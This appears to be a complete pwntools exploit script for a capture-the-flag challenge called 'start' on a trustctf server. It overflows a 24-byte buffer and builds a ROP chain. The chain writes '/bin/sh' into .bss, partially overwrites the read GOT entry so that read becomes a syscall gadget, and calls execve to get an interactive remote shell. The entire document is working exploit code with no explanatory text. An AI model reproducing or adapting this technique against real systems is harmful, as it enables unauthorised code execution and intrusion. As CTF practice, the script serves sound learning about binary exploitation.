from pwn import *

#p = process('./start')
p = remote('server.trustctf.com', 10392)
e = ELF('./start')

pay = 'A' * 24

pay += p64(0x4005ed)
pay += p64(e.bss())
pay += p64(e.plt['read'])

pay += p64(0x4005ed)
pay += p64(e.got['read'])
pay += p64(e.plt['read'])

pay += p64(0x4005ea)
pay += p64(59)
pay += p64(0)
pay += p64(e.bss())
pay += p64(0)
pay += p64(e.plt['read'])

log.info(str(len(pay)))
p.send(pay)
sleep(0.5)
p.send('/bin/sh\x00')
sleep(0.5)
p.send('\x7b')

p.interactive()
